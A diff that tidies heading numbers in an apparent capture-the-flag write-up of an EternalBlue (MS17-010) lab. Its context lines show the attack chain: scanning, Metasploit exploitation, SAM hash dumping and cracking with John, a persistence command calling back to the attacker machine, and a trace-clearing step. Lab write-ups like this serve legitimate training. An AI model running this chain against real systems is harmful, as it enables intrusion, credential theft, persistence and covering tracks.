@@ -25,11 +25,11 @@ The purpose of this room is to provide a guided, beginner‑friendly environment
 
 ## Task 1: Recon
 
-### 1️. Start the Virtual Environment
+### 1. Start the Virtual Environment
 
 I launched both the AttackBox and the target machine, confirmed connectivity, and prepared for scanning.
 
-### 2️/ Port Scan
+### 2. Port Scan
 
 The target does not respond to ICMP ping, so I scanned directly:
 ```bash
@@ -43,7 +43,7 @@ nmap -p 1-999 <target_ip>
 
 <img width="960" height="1032" alt="1" src="https://github.com/user-attachments/assets/1ef3e874-b15c-47c4-bdab-4ae7c0ed299d" />
 
-### 3️. Vulnerability Detection
+### 3. Vulnerability Detection
 
 Checking SMB vulnerability:
 ```bash
@@ -59,13 +59,13 @@ nmap -p 445 --script smb-vuln-ms17-010 <target_ip>
 
 ## Task 2: Gain Access
 
-### 1️. Start Metasploit
+### 1. Start Metasploit
 
 ```bash
 msfconsole
 ```
 
-### 2️. Find EternalBlue Exploit
+### 2. Find EternalBlue Exploit
 
 ```bash
 search ms17_010
@@ -86,7 +86,7 @@ run
 
 <img width="960" height="1032" alt="3" src="https://github.com/user-attachments/assets/48cd1304-fb2d-4fc5-b3e7-d19e828be76b" />
 
-### 4️. Meterpreter Session Gained
+### 4. Meterpreter Session Gained
 
 Successful exploitation yielded:
 
@@ -127,7 +127,7 @@ getuid
 
 ## Task 4: Credential Extraction & Cracking
 
-### 1️. Dump SAM Hashes
+### 1. Dump SAM Hashes
 
 ```bash
 hashdump
@@ -139,7 +139,7 @@ Save the NT hash:
 echo "<hash_here>" > hash.txt
 ```
 
-### 2️ Crack NTLM Hash Using John
+### 2. Crack NTLM Hash Using John
 
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
@@ -153,7 +153,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
 ## Task 5: Post Exploitation
 
-### 1️. System Enumeration
+### 1. System Enumeration
 
 ```bash
 sysinfo
@@ -163,14 +163,14 @@ netstat -ano
 
 <img width="960" height="1032" alt="7" src="https://github.com/user-attachments/assets/4491f525-bc68-49a9-873d-bd60847fd8a2" />
 
-### 2️. User Enumeration
+### 2. User Enumeration
 
 ```bash
 net user
 net localgroup administrators
 ```
 
-### 3️. File System Inspection
+### 3. File System Inspection
 
 ```bash
 dir C:\
@@ -178,7 +178,7 @@ search -f flag*
 download <file>
 ```
 
-### 4️. Persistence (Demonstration Only)
+### 4. Persistence (Demonstration Only)
 
 ```bash
 run persistence -U -i 10 -p 4444 -r <attackbox_ip>
@@ -186,7 +186,7 @@ run persistence -U -i 10 -p 4444 -r <attackbox_ip>
 
 <img width="960" height="1032" alt="8" src="https://github.com/user-attachments/assets/ea25343b-314a-4827-b142-6d7f2d7a957c" />
 
-### 5️. Clearing Traces (For Learning Only)
+### 5. Clearing Traces (For Learning Only)
 
 Typical example:
 ```bash
